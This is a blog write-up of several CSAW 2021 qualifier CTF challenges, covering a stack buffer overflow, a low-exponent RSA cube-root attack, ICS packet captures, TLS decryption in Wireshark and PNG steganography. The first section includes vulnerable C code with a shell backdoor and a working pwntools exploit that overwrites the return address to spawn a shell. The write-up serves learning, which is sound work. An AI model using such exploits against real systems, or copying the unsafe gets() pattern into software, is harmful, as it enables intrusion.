@@ -1,0 +1,491 @@
+---
+layout: post
+title:  "CSAW 2021 Qualifier Writeup"
+tags: CTF
+---
+
+
+## **Warm-up**
+
+### **Password Checker**
+
+```
+Charlie forgot his password to login into his Office portal. Help him to find it.
+```
+
+This challenge is a basic buffer overflow pwn challenge and is a good warmup for the
+category. Here is the decompiled C code.
+
+```
+undefined8 main(EVP_PKEY_CTX *param_1)
+
+{
+  init(param_1);
+  password_checker();
+  return 0;
+}
+
+void password_checker(void)
+
+{
+  undefined8 local_a8;
+  undefined local_a0;
+  char local_78 [48];
+  char local_48 [60];
+  int local_c;
+
+  printf("Enter the password to get in: \n>");
+  gets(local_48);
+  strcpy(local_78,local_48);
+  local_a8 = 0x64726f7773736170;
+  local_a0 = 0;
+  local_c = strcmp(local_78,(char *)&local_a8);
+  if (local_c == 0) {
+    printf("You got in!!!!");
+  }
+  else {
+    printf("This is not the password");
+  }
+  return;
+}
+
+void backdoor(void)
+
+{
+  system("/bin/sh");
+  return;
+}
+```
+
+Our basic goal here is to overflow the buffer local_48 and overwrite the return address
+to point to backdoor(). We can see that the buffer is 60-bytes in size but we probably need to
+put a few more bytes to overwrite to $rip. Through testing with gdb I found the final value to be 72-bytes.
+All that's left is to craft our payload and send it to the server running the binary.
+
+```
+from pwn import *
+
+r = remote('pwn.chal.csaw.io', 5000)
+
+# Add junk data
+payload = b'a'*72
+
+# Add backdoor() function address
+payload += p64(0x401172)
+
+r.recvuntil(b'Enter the password to get in:')
+r.sendline(payload)
+r.interactive()
+```
+
+After the exploit runs, all that's left is to issue a cat command to read flag.txt.
+
+&nbsp;
+
+## **Crypto**
+
+### **Gotta Decrypt Them All**
+
+```
+Can you decrypt them all?
+```
+
+To start off this challenge we are only given an address and port to netcat to.
+Let's see what happens.
+
+![Morse Code](/assets/csawQuals/catch1.png)
+<figcaption align=center><b>Figure 2-1: Server Sends Morse Code</b></figcaption>
+&nbsp;
+
+The server prints out some Morse code and then after a few seconds cuts the connection
+after saying we were too slow to decrypt it. Seems easy enough, let's decode this Morse.
+
+![Morse to Decimal](/assets/csawQuals/catch2.png)
+<figcaption align=center><b>Figure 2-2: Cyberchef Decoding Morse Code</b></figcaption>
+&nbsp;
+
+
+I decoded the Morse code using [Cyberchef](), however, the result seems to be encoded
+as well. This time in decimal. Before submitting let's see if decoding the decimal results
+in anything interesting.
+
+![Decimal to Base64](/assets/csawQuals/catch3.png)
+<figcaption align=center><b>Figure 2-3: Cyberchef Decoding Decimal</b></figcaption>
+&nbsp;
+
+
+Interesting, the result of this step seems to also be encoded, this time in base-64.
+Alright, let's decode one more time.
+
+![Base64 to Plaintext](/assets/csawQuals/catch4.png)
+<figcaption align=center><b>Figure 2-4: Cyberchef Decoding Base-64</b></figcaption>
+&nbsp;
+
+
+Finally, we have normal looking text. However, this set of text appears to be components
+to RSA. Unfortunately, we don't have all the components to decrypt it normally. But on
+the other hand, e has the very low value of 3, so perhaps it's weak to some sort attack.
+In this case, this e value makes the setup weak to a cube root attack.
+
+![Cube Root](/assets/csawQuals/catch5.png)
+<figcaption align=center><b>Figure 2-5: RsaCtfTool Cube Root Attack on RSA</b></figcaption>
+&nbsp;
+
+
+RsaCtfTool confirms that it is vulnerable and therefore all we need to do to get the plaintext
+is take the cube root of c. However, the result of this is also encoded with what
+appears to be a shift cipher. Reversing the shift with ROT13 results in the following text:
+
+```
+Pokemon Names
+```
+
+That was a bit of work but let's input it into the server and see what happens.
+
+![Server Response](/assets/csawQuals/catch6.png)
+<figcaption align=center><b>Figure 2-6: Server Response to the First Phrase</b></figcaption>
+&nbsp;
+
+
+Well it looks it worked but we have to do the whole process again and unfortunately
+this time the resulting plaintext isn't constant. Each set of Morse code following the
+initial one corresponds to a Pokémon's name. There are **a lot** of Pokémon so making
+a script to do all the work for us would be the best way to continue.
+
+```
+import base64
+from pwn import *
+from Crypto.Util.number import long_to_bytes
+from sympy import integer_nthroot
+
+
+morse_dict = {'1':'.----',
+        '2':'..---',
+        '3':'...--',
+        '4':'....-',
+        '5':'.....',
+        '6':'-....',
+        '7':'--...',
+        '8':'---..',
+        '9':'----.',
+        '0':'-----'}
+
+def decrypt_morse(message):
+    result = list()
+    c = ''
+    number = ''
+    for letter in message:
+        if letter != ' ' and letter != '/':
+            i = 0
+            c += letter
+        else:
+            i += 1
+            if i == 2:
+                result.append(int(number))
+                number = ''
+            else:
+                number += list(morse_dict.keys())[list(morse_dict.values()).index(c)]
+                c = ''
+    return result
+
+
+def decode_decimal_list(decimals):
+    result = ""
+    for number in decimals:
+        result += chr(number)
+    return result
+
+def decode_base64(string):
+    string += "="
+    message = base64.b64decode(string)
+    return message.decode().split()
+
+
+# ROT13 Function Source: https://www.dotnetperls.com/rot13-python
+def rot13(s):
+    result = ""
+
+    # Loop over characters.
+    for v in s:
+        # Convert to number with ord.
+        c = ord(v)
+
+        # Shift number back or forward.
+        if c >= ord('a') and c <= ord('z'):
+            if c > ord('m'):
+                c -= 13
+            else:
+                c += 13
+        elif c >= ord('A') and c <= ord('Z'):
+            if c > ord('M'):
+                c -= 13
+            else:
+                c += 13
+
+        # Append to result.
+        result += chr(c)
+
+    # Return transformation.
+    return result
+
+
+def _decrypt():
+    r.recvuntil(b'What does this mean?')
+    r.recvline()
+
+    morse = r.recvline().strip().decode()
+    decimals = decrypt_morse(morse)
+    b64 = decode_decimal_list(decimals)
+
+    rsa_message = decode_base64(b64)
+    rot_message = integer_nthroot(int(rsa_message[8]), 3)[0]
+    rot_message = long_to_bytes(rot_message).decode()
+    print(rot_message)
+
+    plaintext = rot13(rot_message)
+    print(plaintext)
+    return plaintext
+
+r = remote('crypto.chal.csaw.io', 5001)
+r.recvuntil(b'What does this mean?')
+r.recvline()
+r.recvline()
+r.sendline(b'Pokemon Names')
+print(r.recvline())
+
+for i in range(5):
+    plain = _decrypt()
+    print(plain.encode())
+    r.sendline(plain.encode())
+    print(r.recvline())
+
+print(r.recvline())
+print(r.recvline())
+print(r.recvline())
+```
+
+The script I created is a bit messy but it gets the job done (most of the time).
+It does all the steps we did previously on every subsequent code sent by the server.
+Sometimes it fumbles with decrypting the RSA ciphertext but eventually with a handful of tries
+it succeeds in decrypting all Morse code sets.
+
+With a tiny bit of experimentation, I learned that the server only sends 5 encoded
+Pokémon names to us before printing the flag. Here is the result of the script and the challenge's flag.
+
+![Flag](/assets/csawQuals/catch7.png)
+<figcaption align=center><b>Figure 2-7: Results of the Custom Script</b></figcaption>
+&nbsp;
+
+
+## **ICS**
+
+### **The Magic Modbus**
+
+```
+Climb on the Magic Modbus and see if you can find some of the messages being passed around!
+```
+
+This is an interesting challenge that is almost a crossover of hardware and a packet capture.
+The capture focusses on the Modbus protocol which is used for industrial electronic communications.
+The first thing we can notice after opening the capture in Wireshark is we have a couple of types of
+packets: queries and responses.
+
+![Query Response](/assets/csawQuals/modbus1.png)
+<figcaption align=center><b>Figure 3-1: Response Packet Containing an Interesting Decimal Value</b></figcaption>
+&nbsp;
+
+Query packets didn't reveal much plaintext data to us. However, responses contained a single
+value from the queried register. Figure 3-1 shows that these values definitely look like
+decimal values for ascii characters. Let's examine the TCP stream to see if there is anything
+to this.
+
+![Stream](/assets/csawQuals/modbus2.png)
+<figcaption align=center><b>Figure 3-2: TCP Stream of the Modbus Conversation</b></figcaption>
+&nbsp;
+
+
+The stream data contains both the queries and responses. Let's filter this conversation down
+to only responses to see what the values could be.
+
+![Responses](/assets/csawQuals/modbus3.png)
+<figcaption align=center><b>Figure 3-3: Filtered TCP Stream Showing Only Response Data</b></figcaption>
+&nbsp;
+
+Just glancing at this definitely reveals there is a flag in this stream. There is a bit of
+"noise" to our flag right now so let's remove that.
+
+![Flag](/assets/csawQuals/modbus4.png)
+<figcaption align=center><b>Figure 3-4: Removing Noise From the Flag</b></figcaption>
+&nbsp;
+
+Using Cyberchef to do a quick find/replace, I removed the noise and revealed the flag.
+
+&nbsp;
+
+
+### **A Pain in the BAC(net)**
+
+```
+One of the analog sensors reported values way outside of its normal operating range.
+Can you determine the object name of this analog sensor?
+Flag Format: flag{Name-of-sensor}
+```
+
+This is another interesting hardware / packet analysis challenge involving a SCADA system
+packet capture.
+
+![Capture]()
+
+From the start of the capture we can see a bunch of request and response packets to specific
+analog sensors. There are 8 total sensors and they measure various things like temperature, voltage,
+lumens, etc. Unfortunately, in the current state its hard to find a baseline for these values.
+To fix it up a bit I sorted the packets by their info.
+
+![Sorted]()
+
+The packets are now sorted by the sensor number (1-8). Now we can look at the object name, units of the sensor,
+and then go through the present-value packets to see if anything looks out of place. Most of the
+sensors seemed to have normal looking values across the capture.
+
+![Kilowatt]()
+
+Here is Sensor_12345 (number 7 but its object-name is Sensor_12345) which measure
+kilowatt hours. It has a normal operating value around 1500 kWh within the capture.
+However, at some point it changes.
+
+![Spike]()
+
+The Kilowatt hours measurement spikes to 9999 and stays there for a few captures.
+This is definitely odd behaviour and definitely not within the normal we saw in previous packets.
+Submitting this sensor as our flag seems like the best bet and does indeed solve the challenge.
+
+```
+flag{Sensor_12345}
+```  
+
+&nbsp;
+
+
+## **Forensics**
+
+### **Lazy Leaks**
+
+```
+Someone at a company was supposedly using an unsecured communication channel.
+A dump of company communications was created to find any sensitive info leaks.
+See if you can find anything suspicious or concerning.
+```
+
+![Packet Stats](/assets/csawQuals/lazy1.png)
+<figcaption align=center><b>Figure 5-1: Protocol Hierarchy of Lazy_Leaks.pcapng</b></figcaption>
+&nbsp;
+
+This challenge is a simple packet capture analysis. There isn't much trickery going on here,
+the packets are mostly SSH and some Telnet. Since SSH would be encrypted it won't be of much
+use to analyze that. However, Telnet is a plaintext protocol so there might be some details there
+out in the open. I decided to lazily search for the word flag and see what happens.
+
+![Flag Search](/assets/csawQuals/lazy2.png)
+<figcaption align=center><b>Figure 5-2: The Flag Inside a Telnet Packet</b></figcaption>
+&nbsp;
+
+Turns out lazy was the right approach. One of the Telnet packets contained the flag and
+the challenge is already complete.
+
+&nbsp;
+
+
+### **Contact Us**
+
+```
+Veronica sent a message to her client via their website's Contact Us page.
+Can you find the message?
+```
+
+Contact Us is a step into some TLS traffic analysis. Fortunately, this analysis doesn't
+differ too much from a normal one since we are given an SSL key file as well. We can
+input this file into Wireshark through **Edit > Preferences > Protocols > TLS** and
+insert the file location into the (Pre)-Master-Secret log filename section.
+
+![TLS Decode](/assets/csawQuals/contact1.png)
+<figcaption align=center><b>Figure 6-1: Inputting Secret Log File into Wireshark</b></figcaption>
+&nbsp;
+
+Now a majority of the TLS packets in the capture should be decoded and readable by us.
+The challenge hinted at a Contact Us page so I started by searching for that.
+
+![Contact Us Page](/assets/csawQuals/contact2.png)
+<figcaption align=center><b>Figure 6-2: Contact Us Packet With Flag</b></figcaption>
+&nbsp;
+
+After skipping through a number of results I found just the right one. The packet contained
+both "Contact Us" as well as the flag.
+
+&nbsp;
+
+
+### **Sonicgraphy Fallout**
+
+```
+A hacker named Blue_Blur was recently arrested and is accused of hiding some evidence.
+The evidence was reported to have been hidden in the hacker's OC Sonic comic.
+See if you can find any hidden files.
+```
+
+For this challenge we are given a zip file containing a bunch of pictures from the
+mentioned Sonic comic. Let's take a look at what we have.
+
+![Files](/assets/csawQuals/sonic2.png)
+<figcaption align=center><b>Figure 7-1: File Command Displaying the Challenge Files</b></figcaption>
+&nbsp;
+
+We have a bunch of pngs and jpgs from the comic. Weirdly enough most of these files
+have a huge file size so something has to be hidden in at least one of them. Since
+there are a bunch of png files, I decided to examine those first with pngcheck.
+
+![Pngcheck](/assets/csawQuals/sonic3.png)
+<figcaption align=center><b>Figure 7-2: The Results of pngcheck on the Challenge Files</b></figcaption>
+&nbsp;
+
+Pngcheck picks up 2 files with errors in them. Buzz Bomber Fight 2.png appears to be
+neither a png nor a jpg and Page 7.png has some data after the IEND chunk. Page 7.png
+seems the most suspicious since data after the IEND chunk has no effect on the image.
+This makes it a perfect place to hide extra data in the file. Let's look into it.
+
+![IEND](/assets/csawQuals/sonic4.png)
+<figcaption align=center><b>Figure 7-3: Using xxd to Display the Data After the IEND Chunk</b></figcaption>
+&nbsp;
+
+Aha! There is another file header after the IEND tag, it appears to be an mp4 header.
+To extract this data I used dd to trim the starting bytes off Page 7.png. As a side note,
+I did have to make a copy of the file named p7.png because dd has a problem with spaces in file names.
+
+![dd Command](/assets/csawQuals/sonic5.png)
+<figcaption align=center><b>Figure 7-4: Using dd to Output the Hidden Mp4</b></figcaption>
+&nbsp;
+
+The command I use here skips until directly after the IEND tag and outputs the remaining bytes to output.out.
+Let's check out what's in this video.
+
+![Video](/assets/csawQuals/sonic6.png)
+<figcaption align=center><b>Figure 7-5: Screenshot of the Hidden Video</b></figcaption>
+&nbsp;
+
+The video shows Sonic giving us a thumbs up and, more importantly, the flag.
+
+&nbsp;
+
+## **Conclusion**
+
+The CSAW-2021 Qualifiers were an interesting set of challenges with very stable infrastructure.
+Only a few things held it back (mostly some guessy web challenges) and I learned quite a bit
+from the challenges. Definitely a good time and I look forward to next year.
+
+## **Lessons Learned**
+
+1. Basic Buffer Overflow
+2. Cube Root Attack on Low Exponent RSA
+3. Basic Modbus Protocol Capture Analysis
+4. SCADA Traffic Analysis
+5. TLS Traffic Decoding in Wireshark
+6. PNG Steganography - Hidden Files After IEND
